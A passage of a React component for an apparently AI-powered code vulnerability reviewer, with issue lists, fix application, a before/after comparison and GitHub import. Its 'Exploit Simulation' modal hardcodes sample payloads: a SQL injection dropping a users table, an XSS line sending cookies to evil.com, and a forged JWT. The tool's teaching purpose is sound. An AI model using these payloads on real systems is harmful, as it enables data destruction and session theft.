                  border: appliedFixes.size === issues.length ? "1px solid rgba(34,197,94,0.3)" : "none",
                  boxShadow: appliedFixes.size === issues.length ? "none" : "0 0 20px rgba(239,68,68,0.3)",
                  opacity: isFixingAll ? 0.7 : 1,
                }}>
                {isFixingAll ? (
                  <><div className="w-3.5 h-3.5 border-2 border-white/30 border-t-white rounded-full animate-spin" />Fixing all issues…</>
                ) : appliedFixes.size === issues.length ? (
                  <><CheckCircle size={14} />All {issues.length} Issues Fixed</>
                ) : (
                  <><Zap size={14} />Fix All {issues.length} Issues</>
                )}
              </button>

              {fixAllSummary.length > 0 && (
                <div className="rounded-xl p-3 space-y-1.5"
                  style={{ background: "rgba(34,197,94,0.06)", border: "1px solid rgba(34,197,94,0.2)" }}>
                  <div style={{ fontSize: "10px", fontWeight: 700, color: "#22c55e", textTransform: "uppercase", letterSpacing: "0.5px", marginBottom: "6px" }}>
                    ✅ What was fixed
                  </div>
                  {fixAllSummary.map((s, i) => (
                    <div key={i} className="flex gap-2">
                      <span style={{ fontSize: "10px", color: "#22c55e", marginTop: "1px" }}>•</span>
                      <div>
                        <span style={{ fontSize: "11px", fontWeight: 600, color: "#86efac" }}>{safeStr(s.issue)}: </span>
                        <span style={{ fontSize: "11px", color: "#6b7280" }}>{safeStr(s.fix)}</span>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </>
          )}
          {isAnalyzing ? (
            <div className="flex flex-col items-center justify-center h-40 gap-3">
              <div className="w-8 h-8 border-2 rounded-full animate-spin"
                style={{ borderColor: "rgba(99,102,241,0.2)", borderTopColor: "#6366f1" }} />
              <p style={{ fontSize: "13px", color: "#6b7280" }}>Analyzing with AI…</p>
            </div>
          ) : !analyzed ? (
            <div className="flex flex-col items-center justify-center h-40 gap-2 text-center px-4">
              <Shield size={32} style={{ color: "#1e1e3f" }} />
              <p style={{ fontSize: "13px", color: "#4b5563" }}>Run AI Review to detect vulnerabilities</p>
            </div>
          ) : filteredIssues.length === 0 ? (
            <div className="flex flex-col items-center justify-center h-32 gap-2">
              <CheckCircle size={28} style={{ color: "#22c55e" }} />
              <p style={{ fontSize: "13px", color: "#22c55e" }}>No issues in this category</p>
            </div>
          ) : (
            filteredIssues.map((issue, idx) => {
              const s = getSevStyle(issue.severity);
              const isExpanded = expandedIssue === (issue.id || idx.toString());
              const isFixed = appliedFixes.has(issue.id);
              return (
                <div key={issue.id || idx}
                  className="rounded-xl overflow-hidden transition-all"
                  style={{
                    border: isExpanded ? `1px solid ${s.border}` : "1px solid rgba(255,255,255,0.06)",
                    background: isExpanded ? s.bg : "rgba(255,255,255,0.03)",
                  }}>
                  {/* Issue header — always visible */}
                  <div
                    className="flex items-center gap-2 p-3 cursor-pointer"
                    onClick={() => {
                      const id = issue.id || idx.toString();
                      setExpandedIssue(isExpanded ? null : id);
                      if (!isExpanded) handleSelectIssue(issue);
                    }}>
                    <span className="text-xs px-2 py-0.5 rounded shrink-0"
                      style={{ background: `${s.color}20`, color: s.color, fontWeight: 700, fontSize: "10px" }}>
                      {issue.severity?.toUpperCase()}
                    </span>
                    <div className="flex-1 min-w-0">
                      <div style={{ fontSize: "12px", fontWeight: 600, color: "#f9fafb" }}>{safeStr(issue.title)}</div>
                      <div style={{ fontSize: "10px", color: "#6b7280", marginTop: "1px" }}>
                        Line {issue.line || "—"} · {safeStr(issue.type)}
                      </div>
                    </div>
                    <div className="flex items-center gap-1.5 shrink-0">
                      {isFixed && <CheckCircle size={12} style={{ color: "#22c55e" }} />}
                      <span style={{ fontSize: "14px", color: "#4b5563" }}>{isExpanded ? "▲" : "▼"}</span>
                    </div>
                  </div>

                  {/* Expanded detail */}
                  {isExpanded && (
                    <div className="px-3 pb-3 space-y-2 border-t" style={{ borderColor: "rgba(255,255,255,0.06)" }}>
                      {/* What is the problem */}
                      <div className="pt-2">
                        <div style={{ fontSize: "10px", fontWeight: 700, color: "#9ca3af", textTransform: "uppercase", letterSpacing: "0.5px", marginBottom: "4px" }}>
                          📋 Problem
                        </div>
                        <p style={{ fontSize: "11px", color: "#d1d5db", lineHeight: 1.6 }}>{safeStr(issue.description)}</p>
                      </div>

                      {/* Attack context */}
                      <div className="rounded-lg p-2.5"
                        style={{ background: "rgba(239,68,68,0.06)", border: "1px solid rgba(239,68,68,0.15)" }}>
                        <div style={{ fontSize: "10px", fontWeight: 700, color: "#f87171", textTransform: "uppercase", letterSpacing: "0.5px", marginBottom: "4px" }}>
                          ⚔️ How it gets exploited
                        </div>
                        {fixDetail && selectedIssue?.id === issue.id ? (
                          <>
                            <p style={{ fontSize: "11px", color: "#fca5a5", lineHeight: 1.5, marginBottom: "4px" }}>{safeStr(fixDetail.attackVector)}</p>
                            <div style={{ fontSize: "10px", fontWeight: 600, color: "#6b7280", marginBottom: "2px" }}>IMPACT</div>
                            <p style={{ fontSize: "11px", color: "#fcd34d", lineHeight: 1.5 }}>{safeStr(fixDetail.impact)}</p>
                          </>
                        ) : (
                          <p style={{ fontSize: "11px", color: "#fca5a5", lineHeight: 1.5 }}>{safeStr(issue.fix)}</p>
                        )}
                      </div>

                      {/* Prevention */}
                      {fixDetail && selectedIssue?.id === issue.id && fixDetail.prevention && (
                        <div className="rounded-lg p-2.5"
                          style={{ background: "rgba(34,197,94,0.05)", border: "1px solid rgba(34,197,94,0.15)" }}>
                          <div style={{ fontSize: "10px", fontWeight: 700, color: "#22c55e", textTransform: "uppercase", letterSpacing: "0.5px", marginBottom: "4px" }}>
                            🛡️ Prevention
                          </div>
                          <p style={{ fontSize: "11px", color: "#86efac", lineHeight: 1.5 }}>{safeStr(fixDetail.prevention)}</p>
                        </div>
                      )}

                      {/* Fix snippet */}
                      <div>
                        <div style={{ fontSize: "10px", fontWeight: 700, color: "#22c55e", textTransform: "uppercase", letterSpacing: "0.5px", marginBottom: "4px" }}>
                          💡 Fix
                        </div>
                        <div className="rounded-lg p-2" style={{ background: "rgba(0,0,0,0.4)", border: "1px solid rgba(255,255,255,0.06)" }}>
                          {loadingFix && selectedIssue?.id === issue.id ? (
                            <div className="flex items-center gap-2">
                              <div className="w-3 h-3 border-2 rounded-full animate-spin"
                                style={{ borderColor: "rgba(99,102,241,0.2)", borderTopColor: "#6366f1" }} />
                              <span style={{ fontSize: "10px", color: "#6b7280" }}>Loading fix…</span>
                            </div>
                          ) : (
                            <pre style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: "10px", color: "#86efac", margin: 0, whiteSpace: "pre-wrap", wordBreak: "break-all" }}>
                              {safeStr(fixDetail?.afterCode || issue.refactoredCode || issue.fix)}
                            </pre>
                          )}
                        </div>
                      </div>

                      {/* Individual fix + exploit + compare buttons */}
                      <div className="flex gap-2 pt-1">
                        <button
                          onClick={async () => {
                            const fix = await handleGetFix(issue);
                            const candidate = safeStr(fix?.refactoredCode || fix?.afterCode || "");
                            if (candidate && candidate.trim().length > 0) {
                              setCode(candidate);
                              setOriginalCode(candidate); // update so next fix builds on this
                              setAppliedFixes(p => new Set([...p, issue.id]));
                              setIsDiffMode(true);
                            }
                          }}
                          disabled={isFixed || loadingFix}
                          className="flex-1 flex items-center justify-center gap-1 py-2 rounded-lg text-xs font-semibold transition-all hover:opacity-90"
                          style={{
                            background: isFixed ? "rgba(34,197,94,0.15)" : "linear-gradient(135deg, #6366f1, #22d3ee)",
                            color: isFixed ? "#22c55e" : "white",
                            border: isFixed ? "1px solid rgba(34,197,94,0.3)" : "none",
                          }}>
                          {isFixed ? <><CheckCircle size={11} />Fixed</> : <><Zap size={11} />Apply Fix</>}
                        </button>
                        <button
                          onClick={async () => { await handleGetFix(issue); setShowComparison(true); }}
                          className="flex items-center gap-1 px-2.5 py-2 rounded-lg text-xs transition-all hover:opacity-80"
                          style={{ background: "rgba(99,102,241,0.15)", color: "#a5b4fc", border: "1px solid rgba(99,102,241,0.25)" }}
                          title="Before vs After">
                          <ArrowRight size={11} />
                        </button>
                        <button
                          onClick={() => { setSelectedIssue(issue); setShowExploit(true); }}
                          className="flex items-center gap-1 px-2.5 py-2 rounded-lg text-xs transition-all hover:opacity-80"
                          style={{ background: "rgba(239,68,68,0.15)", color: "#f87171", border: "1px solid rgba(239,68,68,0.25)" }}>
                          <AlertTriangle size={11} />Exploit
                        </button>
                        <button
                          onClick={() => {
                            const id = issue.id || issue.title;
                            setAskAiIssueId(askAiIssueId === id ? null : id);
                          }}
                          className="flex items-center gap-1 px-2.5 py-2 rounded-lg text-xs transition-all hover:opacity-80"
                          style={{ background: "rgba(168,85,247,0.15)", color: "#d8b4fe", border: "1px solid rgba(168,85,247,0.25)" }}>
                          <Sparkles size={11} />Ask AI
                        </button>
                      </div>

                      {/* Ask AI chat panel */}
                      {askAiIssueId === (issue.id || issue.title) && (
                        <div className="rounded-xl overflow-hidden"
                          style={{ border: "1px solid rgba(168,85,247,0.25)", background: "rgba(168,85,247,0.05)" }}>
                          {/* Chat messages */}
                          <div className="p-2.5 space-y-2 max-h-48 overflow-y-auto">
                            {/* Suggested questions */}
                            {!(askAiMessages[issue.id || issue.title]?.length) && (
                              <div className="space-y-1.5">
                                <p style={{ fontSize: "10px", color: "#6b7280", marginBottom: "6px" }}>Suggested questions:</p>
                                {[
                                  "Why is this dangerous in production?",
                                  "Show me a real CVE for this",
                                  "How do I test if my code is vulnerable?",
                                ].map(q => (
                                  <button key={q} onClick={() => handleAskAi(issue, q)}
                                    className="w-full text-left px-2.5 py-1.5 rounded-lg text-xs transition-all hover:bg-white/10"
                                    style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.07)", color: "#9ca3af" }}>
                                    {q}
                                  </button>
                                ))}
                              </div>
                            )}
                            {(askAiMessages[issue.id || issue.title] || []).map((msg, i) => (
                              <div key={i} className={`flex ${msg.role === "user" ? "justify-end" : "justify-start"}`}>
                                <div className="rounded-xl px-3 py-2 max-w-[85%]"
                                  style={{
                                    background: msg.role === "user" ? "rgba(99,102,241,0.25)" : "rgba(255,255,255,0.06)",
                                    border: msg.role === "user" ? "1px solid rgba(99,102,241,0.3)" : "1px solid rgba(255,255,255,0.08)",
                                    fontSize: "11px",
                                    color: msg.role === "user" ? "#c7d2fe" : "#d1d5db",
                                    lineHeight: 1.5,
                                  }}>
                                  {msg.text}
                                </div>
                              </div>
                            ))}
                            {askAiLoading && askAiIssueId === (issue.id || issue.title) && (
                              <div className="flex justify-start">
                                <div className="rounded-xl px-3 py-2 flex items-center gap-2"
                                  style={{ background: "rgba(255,255,255,0.06)", border: "1px solid rgba(255,255,255,0.08)" }}>
                                  <div className="w-3 h-3 border-2 rounded-full animate-spin"
                                    style={{ borderColor: "rgba(168,85,247,0.3)", borderTopColor: "#a855f7" }} />
                                  <span style={{ fontSize: "11px", color: "#6b7280" }}>Thinking…</span>
                                </div>
                              </div>
                            )}
                          </div>
                          {/* Input */}
                          <div className="flex gap-1.5 p-2 border-t" style={{ borderColor: "rgba(168,85,247,0.15)" }}>
                            <input
                              value={askAiInput}
                              onChange={e => setAskAiInput(e.target.value)}
                              onKeyDown={e => { if (e.key === "Enter" && !e.shiftKey) { e.preventDefault(); handleAskAi(issue, askAiInput); } }}
                              placeholder="Ask anything about this issue…"
                              className="flex-1 px-2.5 py-1.5 rounded-lg text-xs outline-none"
                              style={{ background: "rgba(255,255,255,0.05)", border: "1px solid rgba(255,255,255,0.08)", color: "#f9fafb" }}
                            />
                            <button
                              onClick={() => handleAskAi(issue, askAiInput)}
                              disabled={!askAiInput.trim() || askAiLoading}
                              className="px-2.5 py-1.5 rounded-lg text-xs transition-all hover:opacity-90"
                              style={{ background: "linear-gradient(135deg, #a855f7, #6366f1)", color: "white", opacity: !askAiInput.trim() ? 0.5 : 1 }}>
                              <Sparkles size={11} />
                            </button>
                          </div>
                        </div>
                      )}
                    </div>
                  )}
                </div>
              );
            })
          )}
        </div>

        {/* Selected issue Apply Fix + Arrow — inside scroll, below issue list */}
        {selectedIssue && analyzed && (() => {
          const s = getSevStyle(selectedIssue.severity);
          const isFixed = appliedFixes.has(selectedIssue.id);
          return (
            <div className="mx-0 mt-1 rounded-2xl p-3 space-y-2"
              style={{ border: `1px solid ${s.border}`, background: "rgba(13,13,35,0.9)" }}>
              {/* Issue title */}
              <div className="flex items-center gap-2 px-3 py-2 rounded-xl"
                style={{ background: s.bg, border: `1px solid ${s.border}` }}>
                <div className="w-2 h-2 rounded-full animate-pulse" style={{ background: s.color }} />
                <span style={{ fontSize: "12px", fontWeight: 700, color: s.color }}>
                  {selectedIssue.severity?.toUpperCase()} — {safeStr(selectedIssue.title)}
                </span>
                <span className="ml-auto text-xs" style={{ color: "#6b7280" }}>Line {selectedIssue.line || "—"}</span>
              </div>
              {/* Buttons */}
              <div className="flex gap-2">
                <button
                  onClick={async () => {
                    setAppliedFixes(p => new Set([...p, selectedIssue.id]));
                    const fix = await handleGetFix(selectedIssue);
                    const candidate = safeStr(fix?.refactoredCode || "");
                    if (candidate && isValidCodeFix(candidate, originalCode)) {
                      setCode(candidate);
                      setIsDiffMode(true);
                    }
                  }}
                  disabled={isFixed || loadingFix}
                  className="flex-1 flex items-center justify-center gap-2 py-2.5 rounded-xl text-sm transition-all hover:opacity-90"
                  style={{
                    background: isFixed ? "rgba(34,197,94,0.2)" : "linear-gradient(135deg, #6366f1, #22d3ee)",
                    fontWeight: 600,
                    color: isFixed ? "#22c55e" : "white",
                    border: isFixed ? "1px solid rgba(34,197,94,0.3)" : "none",
                    opacity: loadingFix ? 0.6 : 1,
                  }}>
                  {loadingFix ? (
                    <><div className="w-3.5 h-3.5 border-2 border-white/30 border-t-white rounded-full animate-spin" />Fixing…</>
                  ) : isFixed ? (
                    <><CheckCircle size={14} />Applied</>
                  ) : (
                    <><Zap size={14} />Apply AI Fix</>
                  )}
                </button>
                <button
                  onClick={async () => { await handleGetFix(selectedIssue); setShowComparison(true); }}
                  className="flex items-center justify-center px-3 py-2.5 rounded-xl transition-all hover:bg-white/10"
                  style={{ border: "1px solid rgba(255,255,255,0.1)", color: "#9ca3af" }}
                  title="Before vs After">
                  <ArrowRight size={16} />
                </button>
              </div>
            </div>
          );
        })()}
      </div>

      {/* Before/After Comparison Modal */}
      {showComparison && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4"
          style={{ background: "rgba(0,0,0,0.85)", backdropFilter: "blur(8px)" }}>
          <div className="w-full max-w-5xl max-h-[80vh] rounded-2xl flex flex-col overflow-hidden"
            style={{ background: "#0d0d23", border: "1px solid rgba(255,255,255,0.1)" }}>
            <div className="flex items-center justify-between px-5 py-4 border-b" style={{ borderColor: "rgba(255,255,255,0.07)" }}>
              <div className="flex items-center gap-2">
                <Sparkles size={16} style={{ color: "#22d3ee" }} />
                <span style={{ fontWeight: 700, fontSize: "15px", color: "#f9fafb" }}>Before vs After — AI Refactored Code</span>
              </div>
              <button onClick={() => setShowComparison(false)} className="text-gray-500 hover:text-gray-300"><X size={18} /></button>
            </div>
            <div className="flex flex-1 overflow-hidden">
              {[
                { label: "Before (Vulnerable)", content: originalCode, color: "#ef4444", accent: "rgba(239,68,68,0.05)" },
                { label: "After (AI Fixed)", content: loadingFix ? "⏳ Fetching AI fix..." : (fixDetail?.refactoredCode || fixDetail?.afterCode || selectedIssue?.refactoredCode || "No fix available"), color: "#22c55e", accent: "rgba(34,197,94,0.05)" },
              ].map(({ label, content, color, accent }) => (
                <div key={label} className="flex-1 flex flex-col overflow-hidden border-r last:border-r-0" style={{ borderColor: "rgba(255,255,255,0.06)" }}>
                  <div className="px-4 py-2 flex items-center gap-2 border-b" style={{ background: accent, borderColor: "rgba(255,255,255,0.06)" }}>
                    <div className="w-2 h-2 rounded-full" style={{ background: color }} />
                    <span style={{ fontSize: "12px", fontWeight: 600, color }}>{label}</span>
                  </div>
                  <div className="flex-1 overflow-y-auto p-4">
                    <pre style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: "12px", color: "#a8b4c8", margin: 0, whiteSpace: "pre-wrap", wordBreak: "break-word" }}>
                      {content}
                    </pre>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* Exploit Simulation Modal */}
      {showExploit && selectedIssue && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4"
          style={{ background: "rgba(0,0,0,0.85)", backdropFilter: "blur(8px)" }}>
          <div className="w-full max-w-lg rounded-2xl overflow-hidden"
            style={{ background: "#0d0d23", border: "1px solid rgba(239,68,68,0.3)" }}>
            <div className="flex items-center justify-between px-5 py-4 border-b" style={{ borderColor: "rgba(239,68,68,0.2)", background: "rgba(239,68,68,0.08)" }}>
              <div className="flex items-center gap-2">
                <AlertTriangle size={16} style={{ color: "#ef4444" }} />
                <span style={{ fontWeight: 700, fontSize: "15px", color: "#f9fafb" }}>Exploit Simulation</span>
              </div>
              <button onClick={() => setShowExploit(false)} className="text-gray-500 hover:text-gray-300"><X size={18} /></button>
            </div>
            <div className="p-5 space-y-4">
              <div className="rounded-xl p-4 space-y-3" style={{ background: "rgba(239,68,68,0.06)", border: "1px solid rgba(239,68,68,0.2)" }}>
                <div><span style={{ fontSize: "11px", color: "#6b7280" }}>VULNERABILITY</span><div style={{ fontSize: "15px", fontWeight: 700, color: "#f9fafb", marginTop: "2px" }}>{safeStr(selectedIssue.title)}</div></div>
                <div><span style={{ fontSize: "11px", color: "#6b7280" }}>SEVERITY</span><div className="inline-flex items-center gap-1.5 px-2 py-0.5 rounded-full ml-2" style={{ background: `${getSevStyle(selectedIssue.severity).color}20`, color: getSevStyle(selectedIssue.severity).color, fontSize: "12px", fontWeight: 700 }}>{selectedIssue.severity?.toUpperCase()}</div></div>
                <div><span style={{ fontSize: "11px", color: "#6b7280" }}>DESCRIPTION</span><p style={{ fontSize: "13px", color: "#d1d5db", marginTop: "4px", lineHeight: 1.6 }}>{safeStr(selectedIssue.description)}</p></div>
                <div><span style={{ fontSize: "11px", color: "#6b7280" }}>HOW TO FIX</span><p style={{ fontSize: "13px", color: "#86efac", marginTop: "4px", lineHeight: 1.6 }}>{safeStr(selectedIssue.fix)}</p></div>
              </div>
              <div className="rounded-xl p-3" style={{ background: "rgba(0,0,0,0.4)", border: "1px solid rgba(255,255,255,0.06)" }}>
                <div style={{ fontSize: "11px", color: "#4b5563", marginBottom: "6px" }}>SIMULATED ATTACK PAYLOAD</div>
                <pre style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: "12px", color: "#fca5a5", margin: 0 }}>
                  {safeStr(selectedIssue.title)?.toLowerCase().includes("sql")
                    ? `' OR '1'='1'; DROP TABLE users; --`
                    : safeStr(selectedIssue.title)?.toLowerCase().includes("xss")
                    ? `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`
                    : safeStr(selectedIssue.title)?.toLowerCase().includes("jwt") || safeStr(selectedIssue.title)?.toLowerCase().includes("secret")
                    ? `jwt.sign({id:1,role:'admin'}, 'secret123') // forged token`
                    : `// Exploit depends on context — review the fix suggestion above`}
                </pre>
              </div>
            </div>
          </div>
        </div>
      )}

      {showGithubModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4" style={{ background: "rgba(0,0,0,0.6)", backdropFilter: "blur(4px)" }}>
          <div className="w-full max-w-lg rounded-2xl p-6 relative flex flex-col" style={{ background: "rgba(13,13,35,0.95)", border: "1px solid rgba(255,255,255,0.1)", boxShadow: "0 20px 60px rgba(0,0,0,0.8)", maxHeight: "80vh", height: "500px" }}>
            <button onClick={() => setShowGithubModal(false)} className="absolute top-4 right-4 text-gray-400 hover:text-white transition-colors">
              <X size={18} />
            </button>
            <div className="flex items-center gap-3 mb-4">
              <div className="w-8 h-8 flex items-center justify-center rounded-lg" style={{ background: "rgba(99,102,241,0.15)" }}><Github size={18} color="#a5b4fc" /></div>
              <div style={{ fontSize: "16px", fontWeight: 700, color: "#f9fafb" }}>Import from GitHub</div>
            </div>
            
            <div className="flex gap-2 mb-4">
              <input value={githubRepoUrl} onChange={e => setGithubRepoUrl(e.target.value)} onKeyDown={e => e.key === "Enter" && fetchRepoContents(githubRepoUrl)} placeholder="Account Username or username/repo" className="flex-1 px-3 py-2 rounded-xl text-sm outline-none" style={{ background: "rgba(255,255,255,0.05)", border: "1px solid rgba(255,255,255,0.1)", color: "#f9fafb" }} />
              <button onClick={() => fetchRepoContents(githubRepoUrl)} disabled={githubLoading} className="px-4 py-2 rounded-xl text-sm font-semibold transition-all hover:opacity-90 disabled:opacity-50" style={{ background: "linear-gradient(135deg, #6366f1, #a855f7)", color: "white" }}>
                {githubLoading ? "Loading..." : "Fetch"}
              </button>
            </div>
            
            {githubError && <div className="text-red-400 text-sm mb-4 bg-red-400/10 p-2 rounded-lg">{githubError}</div>}
            
            <div className="flex-1 overflow-y-auto rounded-xl" style={{ border: "1px solid rgba(255,255,255,0.06)", background: "rgba(0,0,0,0.3)" }}>
              {(githubCurrentPath || githubRepoUrl.includes('/')) && (
                <button onClick={() => {
                  if (githubCurrentPath) fetchRepoContents(githubRepoUrl, githubCurrentPath.split('/').slice(0, -1).join('/'));
                  else fetchRepoContents(githubRepoUrl.split('/')[0]);
                }} className="flex items-center gap-2 w-full text-left px-4 py-3 hover:bg-white/5 transition-colors border-b border-white/5 text-sm" style={{ color: "#a5b4fc" }}>
                  <Folder size={14} /> .. (Go back)
                </button>
              )}
              {githubFiles.map(file => (
                <button key={file.path || file.name} onClick={() => handleGithubFileSelect(file)} disabled={githubLoading} className="flex items-center gap-3 w-full text-left px-4 py-3 hover:bg-white/5 transition-colors border-b border-white/5 text-sm last:border-0" style={{ color: ["dir", "repo"].includes(file.type) ? "#e5e7eb" : "#9ca3af" }}>
                  {file.type === "dir" ? <Folder size={14} color="#fcd34d" /> : file.type === "repo" ? <Github size={14} color="#a5b4fc" /> : <FileText size={14} />}
                  {file.name}
                </button>
              ))}
              {!githubLoading && githubFiles.length === 0 && !githubError && (
                <div className="p-8 text-center text-sm text-gray-500">
                  <Github size={24} className="mx-auto mb-3 opacity-20" />
                  Enter a GitHub account username above (e.g. facebook) and hit Fetch to browse repositories and files.
                </div>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
